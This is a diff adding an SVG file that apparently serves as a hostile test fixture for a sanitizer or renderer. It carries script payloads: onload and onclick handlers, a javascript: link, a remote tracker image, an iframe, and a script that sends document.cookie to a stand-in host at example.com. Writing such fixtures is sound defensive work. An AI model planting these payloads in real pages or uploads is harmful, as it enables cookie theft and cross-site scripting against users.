@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="120" onload="document.title='pwned'">
+  <title>Hostile test file: scripts, handlers and remote references that must never run or load</title>
+  <script>window.parent.postMessage('pwned', '*'); fetch('https://example.com/steal?c=' + document.cookie);</script>
+  <rect width="200" height="120" fill="#ffd60a" onclick="alert(1)"/>
+  <image xlink:href="https://example.com/tracker.png" width="10" height="10"/>
+  <a xlink:href="javascript:alert(2)"><text x="20" y="66" font-size="18" font-family="Helvetica">Nothing runs here</text></a>
+  <foreignObject width="200" height="40"><div xmlns="http://www.w3.org/1999/xhtml"><iframe src="https://example.com"></iframe></div></foreignObject>
+</svg>
